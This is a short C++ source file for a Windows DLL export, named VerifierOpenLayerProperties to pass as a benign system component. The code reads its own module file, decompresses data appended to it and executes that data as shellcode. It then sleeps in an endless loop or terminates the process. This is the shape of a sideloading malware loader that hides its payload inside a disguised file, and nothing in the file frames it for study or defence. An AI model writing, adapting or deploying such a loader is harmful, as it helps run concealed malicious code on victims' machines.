#include "stdafx.h"

__shared_api_ void __stdcall VerifierOpenLayerProperties(void) {
	do {
		if (!shared::Win::ShellcodeExecuteByPEAppenddata(0, \
			shared::Win::File::Read(shared::Win::GetModulePathnameA()),
			[](const auto& in, const auto& origin, auto& out) {
				return (Z_OK == shared::Zip::zipUnCompress(in, origin, out));
			}))
			break;

			do {
				std::this_thread::sleep_for(std::chrono::seconds(1));
			} while (1);
	} while (0);

	::TerminateProcess(::GetCurrentProcess(), 3762);
	::_exit(3762);
}//@23
